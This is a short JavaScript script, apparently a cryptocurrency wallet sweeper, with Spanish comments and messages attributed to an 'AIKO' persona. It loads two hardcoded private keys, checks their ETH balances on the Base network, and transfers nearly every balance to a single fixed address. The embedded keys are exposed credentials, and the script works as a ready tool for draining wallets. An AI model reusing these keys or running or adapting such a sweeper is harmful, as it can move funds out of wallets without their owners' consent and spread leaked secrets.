const { ethers } = require("ethers");

async function hunt() {
    const ProviderClass = ethers.JsonRpcProvider || (ethers.providers ? ethers.providers.JsonRpcProvider : null);
    const provider = new ProviderClass("https://mainnet.base.org");
    
    // Llaves para rastreo de combustible
    const keys = ["f2e1a2050e37209695c8280ee41b34bb93012e07051c7b3af28a9d56bd4b060a", "2de75a7c0bd1386be97a920172259f39f75bb5c66277c34cc0db223d530b04c4"];
    const target = "0x1d72232264329f362aAEE4B8DC6f9592175E6562";

    console.log("🕵️‍♂️ [AIKO]: Escaneando wallets en busca de ETH (Base)...");
    
    for (const key of keys) {
        try {
            const wallet = new ethers.Wallet(key, provider);
            const balance = await provider.getBalance(wallet.address);
            const ethBalance = ethers.formatEther ? ethers.formatEther(balance) : ethers.utils.formatEther(balance);
            
            console.log(`🔍 Wallet ${wallet.address.substring(0,6)}...: ${ethBalance} ETH`);

            if (balance > 100000000000000n) { // > 0.0001 ETH
                console.log("🎯 Gas detectado. Transfiriendo a wallet de soberanía...");
                const tx = await wallet.sendTransaction({
                    to: target,
                    value: balance - 50000000000000n // Reserva mínima para el envío
                });
                await tx.wait();
                console.log("✅ Combustible transferido con éxito.");
            }
        } catch (e) { continue; }
    }
}
hunt();
